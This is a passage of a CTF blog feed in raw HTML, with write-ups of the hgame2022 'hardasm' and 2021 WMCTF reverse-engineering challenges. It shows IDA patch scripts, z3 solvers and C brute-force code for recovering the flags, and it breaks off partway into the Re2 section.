class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a[i] = tmp[b[i]&amp;<span class="number">0xf</span>]</span><br><span class="line">        <span class="keyword">if</span> b[i+<span class="number">16</span>]&amp;<span class="number">0x80</span>:</span><br><span class="line">            a[i+<span class="number">16</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a[i+<span class="number">16</span>] = tmp[<span class="number">16</span>+(b[i+<span class="number">16</span>]&amp;<span class="number">0xf</span>)]</span><br><span class="line">    </span><br><span class="line">vpermd(ymm7, ymm4)</span><br><span class="line">vpxor(ymm4, ymm5)</span><br><span class="line">vpxor(ymm0, ymm2)</span><br><span class="line">vpaddb(ymm0, ymm2)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">vpxor(ymm4, ymm1)</span><br><span class="line">vpaddb(ymm2, ymm5)</span><br><span class="line">vpxor(ymm0, ymm1)</span><br><span class="line">vpaddb(ymm0, ymm5)</span><br><span class="line">vpermd(ymm7, ymm5)</span><br><span class="line">vpaddb(ymm0, ymm4)</span><br><span class="line">vpshufb(ymm5, ymm6)</span><br><span class="line">vpsubb(ymm3, ymm1)</span><br><span class="line">vpaddb(ymm5, ymm1)</span><br><span class="line">vpermd(ymm7, ymm1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    s.add(ymm0[i] == enc[i])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    ymm0 = [BitVec(<span class="string">'x%d'</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">    flag = [m[i].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> ymm0]</span><br><span class="line">    print(bytes(flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Not Found!"</span>)</span><br></pre></td></tr></table></figure><p>开始一直没找到正确的解，检查到错误是没有注意python中运算符优先级的问题。</p><p>这里，开始一直以为 + 的优先级低于 &amp; ，所以就没打括号，其实 + 比 &amp; 的优先级高。</p><p><img src="/2022/02/19/hgame2022-hardasm/image-20220216192053182.png" alt="image-20220216192053182"></p><p>运行解题脚本得到flag：</p><p><strong>hgame{right_your_asm_is_good!!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021WMCTF</title>
      <link href="/2021/09/01/2021WMCTF/"/>
      <url>/2021/09/01/2021WMCTF/</url>
      
        <content type="html"><![CDATA[<p>2021WMCTF中的Re1&amp;Re2<a id="more"></a></p><p><img src="https://i.loli.net/2021/09/01/wZVrS5mPcqgOIBf.png" alt="image-20210901104413498"></p><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>首先ida反编译main函数会报错，这个一般是程序中有花指令导致的。</p><p><img src="https://i.loli.net/2021/09/01/UySsFAqPHh9vrlg.png" alt="image-20210829170116423"></p><p>因为main函数比较大，用提示成功字符串定位到最后的汇编代码，向上翻翻便看见出问题的代码。</p><p><img src="https://i.loli.net/2021/09/01/i83BrAKLlRDZt6F.png" alt="image-20210829170943477"></p><p>双击该地址，可以发现ida将这段数据解析成了代码且最上面有一个设置的条件绝对跳转跳过了执行下面的错误带代码，这里可以直接把jnb改成jmp，并把下面垃圾代码nop掉。</p><p><img src="https://i.loli.net/2021/09/01/O7oRGYaErsZPN6p.png" alt="image-20210829171215050"></p><p>继续向上翻又可以看见如下的花指令：不断跳转到下一条指令，统统nop掉即可。</p><p><img src="https://i.loli.net/2021/09/01/8fCxu3cEKjw5pDi.png" alt="image-20210829171732791"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x140002DEC</span></span><br><span class="line"><span class="keyword">while</span> addr &lt;= <span class="number">0x140002DFF</span>:</span><br><span class="line">    patch_byte(addr, <span class="number">0x90</span>)</span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line">print(<span class="string">'*'</span>*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>然后我们就可以反编译了。</p><p>先看到对输入的处理：</p><p>开始判断了flag长度范围[12, 45]，然后判断格式是否是WMCTF{}</p><p><img src="https://i.loli.net/2021/09/01/wCkvUQcpjbKXltx.png" alt="image-20210829172248646"></p><p>接着申请了576字节大小的空间block，并把输入的除去格式（WMCTF{}外）的前4个字节以如下方式填入block</p><p><img src="https://i.loli.net/2021/09/01/mMqW2y8pCfrTDeU.png" alt="image-20210829172605480"></p><p>再把输入的除去格式（WMCTF{}外）的4-20字节填入block+530开始的位置。</p><p><img src="https://i.loli.net/2021/09/01/x5Vl4gT7pdfGnKo.png" alt="image-20210829172802321"></p><p>最后就是将剩下的输入以<strong>_@#?!&amp;-$+</strong>为区分，分别进行不同的处理。其中输入是hex形式，先把每4个hex转化两字节数据后，再用第一字节作为index，第二字节作为数据对block进行操作。</p><p><img src="https://i.loli.net/2021/09/01/ycgMrSDpYtGohUf.png" alt="image-20210829173407068"></p><p>下面再看加密部分：</p><p>首先sub_7FF79BD33960()函数也是加了上面所说的花指令，去除后看到伪代码，用CRC算法生成256个4字节数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_7FF79BD33960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v3 = (v3 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0x8320EDB8</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v3 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_7FF79BD57A70[i] = v3;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对前4字节填充的block，用CRC生成的256个4字节数据，经过移位，异或运算生成4个4字节数据后与硬编码的数据比较：</p><p><img src="https://i.loli.net/2021/09/01/HDFh2Ylg8VEes59.png" alt="image-20210829174325762"></p><p><img src="https://i.loli.net/2021/09/01/LuSIUtCTyFOZ1qm.png" alt="image-20210829174351699"></p><p>最后使用最开始在block填充的<strong>0xDEAD</strong>改变<strong>vars88，vaes84, vaes80, v58</strong>后作为密钥对除去WMCTF{}格式外输入的4-20字节进行2个xtea加密。    </p><p><img src="https://i.loli.net/2021/09/01/4slm7KUnSZgWqM9.png" alt="image-20210829175035556"></p><p>下面开始解密：</p><p>首先用z3将vars88，vaes84, vaes80, v58四个值就求出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">key = [BitVec(<span class="string">'x%d'</span>%i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">s.add((key[<span class="number">0</span>]+key[<span class="number">1</span>]) == <span class="number">0x11AB7A7A</span>)</span><br><span class="line">s.add(key[<span class="number">1</span>]-key[<span class="number">2</span>] == <span class="number">0x1CD4F222</span>)</span><br><span class="line">s.add(key[<span class="number">2</span>]+key[<span class="number">3</span>] == <span class="number">0xC940F021</span>)</span><br><span class="line">s.add(key[<span class="number">0</span>]+key[<span class="number">2</span>]-key[<span class="number">3</span>] == <span class="number">0x7C7D68D1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    m = [m[key[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    print(m)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">    print(<span class="string">'Not Found!'</span>)</span><br><span class="line"><span class="comment">#[2750330814, 1841087164, 1357369498, 2019106695]</span></span><br></pre></td></tr></table></figure><p>再用上面4个数据依次爆破出对应的4字节明文数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> box[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">char</span> res[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> number[] = &#123;<span class="number">0x100</span>, <span class="number">0x100</span>, <span class="number">0xf</span>, <span class="number">0x1c</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> enc[] = &#123;<span class="number">2750330814</span>, <span class="number">1841087164</span>, <span class="number">1357369498</span>, <span class="number">2019106695</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_box</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v3 = (v3 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0x8320EDB8</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v3 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    box[i] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">fun1</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">char</span> a2[<span class="number">256</span>], <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line">v4 = a1;</span><br><span class="line"><span class="keyword">while</span> ( v5 &lt; a3 )</span><br><span class="line">v4 = (v4 &gt;&gt; <span class="number">8</span>) ^ box[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(a2[v5++] ^ v4)];</span><br><span class="line"><span class="keyword">return</span> a1 ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">bp</span><span class="params">(<span class="keyword">int</span> up, <span class="keyword">int</span> number, <span class="keyword">unsigned</span> <span class="keyword">int</span> pre, <span class="keyword">unsigned</span> <span class="keyword">int</span> next)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> block[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number; j++)</span><br><span class="line">&#123;</span><br><span class="line">block[j] = i+j+up;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fun1(pre, block, number) == next)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">gen_box();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">res[i] = bp(i, number[i], <span class="number">-2</span>, enc[i]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res[i] = bp(i, number[i], enc[i<span class="number">-1</span>], enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Hah4</span></span><br></pre></td></tr></table></figure><p>用满足前4字节的测试输入<strong>WMCTF{Hah41111111111111111}</strong>输入程序，然后在xtea加密前取出密钥：</p><p><img src="https://i.loli.net/2021/09/01/lWCZjIF1rBvfhKG.png" alt="image-20210829182648792"></p><p>但用这个密钥解密密文怎么都不正确。。还测试了自己的xtea解密好几遍，这里卡了好一会。</p><p>后面确定肯定是密钥的问题，但输入的前4字节是满足要求的，密钥是通过前4字节明文算出来的。但注意这里的密钥还用开始在block填充的<strong>0xDEAD</strong>的经过了变换的。这让我想到我忽略了输入的（WMCTF{}格式外）20字节后处理，开始闲麻烦懒得看直接跳过了。</p><p>所以问题现在应该就出在了有两个字节数据对密钥的影响。</p><p>爆破这2个字节，从解密结果中看像是flag的片段的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_delat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0</span>, delat = <span class="number">0x667E5433</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">ans -= delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt1</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x667E5433</span>, sum = get_delat();</span><br><span class="line"><span class="comment">//printf("%x", sum);  </span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; num_rounds; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);  </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    v[<span class="number">0</span>]=v0, v[<span class="number">1</span>]=v1;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">unsigned</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((<span class="keyword">char</span> *)&amp;a)[i] &lt; <span class="number">32</span> || ((<span class="keyword">char</span> *)&amp;a)[i] &gt; <span class="number">127</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//['a3eeb7be', '6dbcc2bc', '50e7d09a', '78591f87']</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">0x78591FAD</span>, <span class="number">0x6DBCC2BC</span>, <span class="number">0xA3EEB7BE</span>, <span class="number">0x50E7DE9A</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">10</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0xff</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>]=&#123;<span class="number">0x1989FB2B</span>, <span class="number">0x83F5A243</span>&#125;;</span><br><span class="line">    k[<span class="number">3</span>] &amp;= <span class="number">0xFFFF00FF</span>;</span><br><span class="line">    k[<span class="number">3</span>] |= i &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    k[<span class="number">0</span>] &amp;= <span class="number">0xFFFFFF00</span>;</span><br><span class="line">    k[<span class="number">0</span>] |= j;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r=<span class="number">32</span>;</span><br><span class="line">    decrypt1(r, v, k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(v[<span class="number">0</span>]) &amp;&amp; check(v[<span class="number">1</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>, ((<span class="keyword">char</span> *)v)[k]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %x %x"</span>, i, j);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pWRTPO&#123;&gt; 13 9f</span></span><br><span class="line"><span class="comment">&lt;&lt;R|CJA&lt; 24 c7</span></span><br><span class="line"><span class="comment">\o&#123;2%lSf 28 7f</span></span><br><span class="line"><span class="comment">t&lt;o.:RMY 2d 69</span></span><br><span class="line"><span class="comment">b%AGkVTt 36 2d</span></span><br><span class="line"><span class="comment">e.xQVP!| 53 0</span></span><br><span class="line"><span class="comment">0bOMoJI8 54 b1</span></span><br><span class="line"><span class="comment">"pWU3*@+ 73 d2</span></span><br><span class="line"><span class="comment">&gt;]zSE&gt;?d 81 d7</span></span><br><span class="line"><span class="comment">(sqF m# 8a 6b</span></span><br><span class="line"><span class="comment">Z,wRg8T_ 92 76</span></span><br><span class="line"><span class="comment">yOu_L1kE b7 ad</span></span><br><span class="line"><span class="comment">!vta&amp;K]M ba d3</span></span><br><span class="line"><span class="comment">K?Gl@~Rw bf b5</span></span><br><span class="line"><span class="comment">1C ="`~p c3 71</span></span><br><span class="line"><span class="comment">?&amp;bqWg]_ cd b1</span></span><br><span class="line"><span class="comment">SX|6u|v f4 43</span></span><br><span class="line"><span class="comment">+zWv6`!C fb a2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看到<strong>yOu_L1kE</strong>，满足要求的两个字节是<strong>0xb7 0xad</strong></p><p>然后解密2段密文再按一定顺序拼接一下得到：<strong>_D0_yOu_L1kE_It!</strong></p><p>现在就是去求<strong>_@#?!&amp;-$+</strong>对应的处理函数怎么才能将<strong>*((_WORD *)Block + 273)</strong>的0xDEAD的改为<strong>0xB7AD</strong>。</p><p>输入为hex，4字节为一组转化为2个byte，第一个byte是index，第二个byte是data</p><p>根据要求推算出这样一个顺序是满足b要求的：</p><p>首先<strong>@</strong>对应的处理函数将block[256] = 0xFE。注意下面是char a2，所以传入0xFF就是-1了，因此满足输入为：<strong>@FFFE</strong>    </p><p><img src="https://i.loli.net/2021/09/01/m2RqHBcrTwPhI8Q.png" alt="image-20210829184654158"></p><p>然后<strong>#</strong>对应的处理函数将block[528] = 0x20，因此满足输入：<strong>#0F20</strong></p><p><img src="https://i.loli.net/2021/09/01/aT1OC7P96SeRlNo.png" alt="image-20210829185055634"></p><p>最后<strong>-</strong>对应的处理函数将block[527] = 0xB7，也是我们最后的终点。因此满足输入：<strong>-11B7</strong></p><p><img src="https://i.loli.net/2021/09/01/PzsK7JmUxGaF5tX.png" alt="image-20210829185410469"></p><p>可以看到上面要能执行最后的<strong>*(_BYTE *)(a1 + 530 + a2) = a3;</strong>要求是(*(unsigned __int16 *)(a1 + 528) % 16) == 0，(unsigned int)(*(unsigned __int16 *)(a1 + 528) / 16) &lt; 3</p><p>用这2个限制爆破得到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xff</span>) <span class="keyword">if</span> i%<span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> i/<span class="number">16</span> &lt; <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>]</span><br></pre></td></tr></table></figure><p>而我们的index为17且<strong>index&lt;*(unsigned __int16 *)(a1 + 528)</strong>，所以满足要求的就只有最后的32了，故上面<strong>#</strong>对应的处理函数要将block[528] = 0x20。</p><p>最后将我们的所有输入拼接起来得到flag：</p><p><strong>WMCTF{Hah4_D0_yOu_L1kE_It!@FFFE#0F20-11B7}</strong></p><h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p>jadx打开app，可以看到关键在native层。</p><p><img src="https://i.loli.net/2021/09/01/6iuHhIPyFMdlsUv.png" alt="image-20210830093652342"></p><p>到so文件找到<strong>JNI_Onload</strong></p><p><img src="https://i.loli.net/2021/09/01/kQNo85bOAezrqKy.png" 